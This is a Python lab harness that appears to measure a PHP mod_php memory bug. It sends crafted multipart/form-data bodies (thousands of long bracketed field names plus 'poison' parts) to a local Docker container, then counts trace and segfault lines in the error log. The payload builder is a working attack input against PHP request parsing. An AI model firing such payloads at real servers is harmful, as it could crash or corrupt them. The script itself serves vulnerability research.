#!/usr/bin/env python3
"""oom54: instrumented mod_php measurement v2.
Fixes: poll-until-lab-ini-active before firing; error.log via docker cp +
host-side census (no exec hang). Then: attack x3 (in-window fatal), benign x10,
census reads, restore stock."""
import subprocess
import time
import urllib.request

LAB = "http://127.0.0.1:8081"
CONF = "/usr/local/etc/php/conf.d/30-oomlab.ini"
NAMELEN = 3064
EXTDIR = "/usr/lib/apache2/modules"
LIB = EXTDIR + "/libphp.so"


def sh(cmd, timeout=25):
    try:
        r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                           capture_output=True, timeout=timeout)
        return (r.stdout.decode("latin1") + r.stderr.decode("latin1")[:200]).strip()
    except subprocess.TimeoutExpired:
        return "<<EXEC TIMEOUT>>"


def key_part(i):
    head = (b'--BOUND\r\nContent-Disposition: form-data; name="p' + b"K" * (NAMELEN - 8) +
            (b"%d" % i) + b'[x]"\r\n\r\n')
    return head + b"v\r\n"


def poison_part(n):
    cell = bytes([8, 8, 8, 8, 8, 8, 8, 8, 8, 1, 8, 8, 8, 8, 8, 8])
    nm = b"q" + cell * 10237 + (b"%06d" % n)
    return b'--BOUND\r\nContent-Disposition: form-data; name="' + nm + b'"\r\n\r\nv\r\n'


def build_attack(k1=2044, prep=3):
    ps = [key_part(i) for i in range(k1)]
    ps += [poison_part(n) for n in range(prep)]
    ps += [key_part(i) for i in range(k1, 4200)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


def http(path, body=None, ctype=None, timeout=30):
    req = urllib.request.Request(LAB + path, data=body)
    if ctype:
        req.add_header("Content-Type", ctype)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("latin1", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("latin1", "replace")[:150]
    except Exception as e:
        return type(e).__name__, str(e)[:150]


def wait_lab_ini(timeout_s=40):
    """Restart container until server reports lab values; return final probe."""
    t0 = time.time()
    probe = "?"
    while time.time() - t0 < timeout_s:
        subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
        for _ in range(15):
            time.sleep(1.5)
            c, probe = http("/oom_sapi.php", timeout=5)
            if c == 200:
                break
        if "lim=20600000" in probe and "vars=100000" in probe:
            return probe
    return probe


def main():
    try:
        print("=== swap ===", flush=True)
        print(sh("cp %s /tmp/libphp.so.stock && echo backed-up" % LIB))
        subprocess.run(["docker", "cp", "phpbuild:/usr/src/php-8.2.34/libs/libphp.so",
                        "/tmp/libphp.so.instr"], check=True)
        subprocess.run(["docker", "cp", "/tmp/libphp.so.instr", "php_vuln:" + LIB], check=True)
        with open("/tmp/phplab/oomlab.ini", "w") as f:
            f.write("memory_limit=20600000\nmax_input_vars=100000\npost_max_size=4096M\n")
        subprocess.run(["docker", "cp", "/tmp/phplab/oomlab.ini", "php_vuln:" + CONF], check=True)
        # instrumented libphp has no built-in ini scan path -> PHPRC via apache envvars
        subprocess.run(["docker", "cp", "php_vuln:/etc/apache2/envvars",
                        "/tmp/phplab/envvars"], check=True)
        ev = open("/tmp/phplab/envvars").read()
        if "PHPRC" not in ev:
            ev += "\nexport PHPRC=/usr/local/etc/php/conf.d/30-oomlab.ini\n"
            open("/tmp/phplab/envvars", "w").write(ev)
            subprocess.run(["docker", "cp", "/tmp/phplab/envvars",
                            "php_vuln:/etc/apache2/envvars"], check=True)
            print("[envvars] PHPRC added", flush=True)
        probe = wait_lab_ini()
        print("[ini]", probe, flush=True)
        if "lim=20600000" not in probe:
            print("[ABORT] lab ini never became active", flush=True)
            return
        sh(": > /var/log/apache2/error.log")
        print("[mark] log truncated", flush=True)

        att = build_attack()
        print("[attack] %d bytes x3" % len(att), flush=True)
        for i in range(3):
            code, text = http("/oom_mod.php", att,
                              "multipart/form-data; boundary=BOUND", 30)
            print("  atk%d: %s %r" % (i, code, text[:70]), flush=True)
        for i in range(10):
            http("/oom_mod.php",
                 b"--BOUND\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\n1\r\n--BOUND--\r\n",
                 "multipart/form-data; boundary=BOUND", 15)
        time.sleep(2)
        subprocess.run(["docker", "cp", "php_vuln:/var/log/apache2/error.log",
                        "/tmp/phplab/moderr.log"], check=True)
        s = open("/tmp/phplab/moderr.log", "r", errors="replace").read()
        print("[census] bytes=%d" % len(s), flush=True)
        kc = s.count("TRACE keycommit")
        ko = s.count("TRACE keyok")
        print("keycommit=%d keyok=%d in-window=%s" % (kc, ko, kc > ko))
        import re
        big = re.findall(r"PROBE (?:hash_destroy|array_destroy)[^\n]*nNumUsed=(\d+)", s)
        big = sorted((int(x) for x in big), reverse=True)[:8]
        print("largest destroy nNumUsed:", big)
        print("array_destroy fires:", s.count("PROBE array_destroy"))
        seg = [l for l in s.splitlines() if "Segmentation" in l or "signal" in l][:4]
        print("segv lines:", seg if seg else "(none)")
        print("[VERDICT] in_window=%s table_walked=%s segv=%s"
              % (kc > ko, bool(big and big[0] >= 3000), bool(seg)), flush=True)
    finally:
        print("=== restore ===", flush=True)
        sh("rm -f " + CONF)
        sh("cp /tmp/libphp.so.stock " + LIB + " 2>/dev/null")
        subprocess.run(["docker", "restart", "php_vuln"])
        for _ in range(20):
            time.sleep(1.5)
            if http("/oom_sapi.php", timeout=5)[0] == 200:
                break
        print("[restored]", http("/oom_sapi.php", timeout=10))


if __name__ == "__main__":
    main()
